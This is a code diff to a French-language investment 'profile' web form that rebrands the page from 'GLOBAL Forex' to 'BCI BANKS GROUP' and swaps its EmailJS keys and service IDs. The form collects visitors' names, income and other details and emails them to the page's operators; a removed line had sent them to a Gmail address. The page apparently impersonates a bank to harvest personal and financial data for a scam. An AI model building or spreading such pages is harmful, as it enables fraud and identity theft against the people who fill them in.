@@ -4,7 +4,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>GLOBAL Forex Investissement</title>
+  <title>BCI BANKS GROUP Investissement</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
@@ -17,7 +17,7 @@
   <div class="pt-24 w-full flex flex-col items-center">
     <form id="profilForm" class="w-full max-w-lg bg-gradient-to-br from-gray-800 via-gray-700 to-gray-900 rounded-3xl shadow-2xl px-8 py-10 animate-fade-in border border-yellow-400/50 backdrop-blur-md">
       <h2 class="text-3xl font-bold text-center text-yellow-400 mb-10 flex items-center justify-center gap-3 drop-shadow-lg">
-        <i class="fas fa-user-shield text-yellow-400 animate-bounce"></i> GLOBAL GROUP Investissement
+        <i class="fas fa-user-shield text-yellow-400 animate-bounce"></i> BCI BANKS GROUP Investissement
       </h2>
       <div class="form-group mb-6">
         <label for="nom" class="block text-yellow-400 font-semibold mb-2"><i class="fas fa-user mr-2"></i>Nom complet</label>
@@ -568,7 +568,7 @@
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
   (function(){
-    emailjs.init("QEMjZAGsS2IA6-X0w"); // ⚡ Mets ici ta clé publique
+    emailjs.init("YhhMYwlkwSNFj81_b"); // ⚡ Mets ici ta clé publique
   })();
 
   document.getElementById('profilForm').addEventListener('submit', function(e) {
@@ -586,9 +586,7 @@
       revenu: document.getElementById('revenu').value
     };
 
-    emailjs.send("service_9vthppn", "template_nmo6dym", , {
-       to: "bcibanksa@gmail.com",
-   } data)
+    emailjs.send("service_p7rztbv", "template_ki0f69a", data)
       .then(function(response) {
         document.getElementById('successMsg').textContent = "✅ Données envoyées avec succès !";
       }, function(error) {
